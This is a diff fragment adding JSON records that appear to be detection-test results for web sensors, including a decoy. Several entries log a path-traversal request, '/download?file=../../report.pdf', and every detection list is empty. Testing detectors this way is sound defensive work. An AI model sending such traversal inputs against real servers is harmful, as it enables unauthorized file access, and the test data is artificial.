+   "method": "GET",
+   "url": "/download?file=../../report.pdf",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/download?file=../../report.pdf",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "",
+   "status": 400,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "",
+   "status": 400,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  }
+ ],
+ "rolled_back": true
+}
